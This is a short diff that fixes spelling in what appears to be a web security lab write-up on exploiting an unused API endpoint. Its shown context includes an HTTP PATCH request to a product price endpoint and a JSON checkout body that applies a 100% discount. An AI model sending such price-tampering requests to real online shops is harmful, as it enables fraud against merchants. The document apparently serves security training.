@@ -2,7 +2,7 @@
 
 ## Finding and exploiting an unused API endpoint
 
-The `price` endpont not only allows the `GET` methode but also `PATCH` 
+The `price` endpoint not only allows the `GET` method but also `PATCH`.
 
 ```
 PATCH /api/products/1/price HTTP/2
@@ -29,3 +29,4 @@ Content-Type: application/json;charset=UTF-8
 
 {"chosen_discount":{"percentage": 100},"chosen_products":[{"product_id":"1","name":"Lightweight \"l33t\" Leather Jacket","quantity":1,"item_price":133700}]}
 ```
+
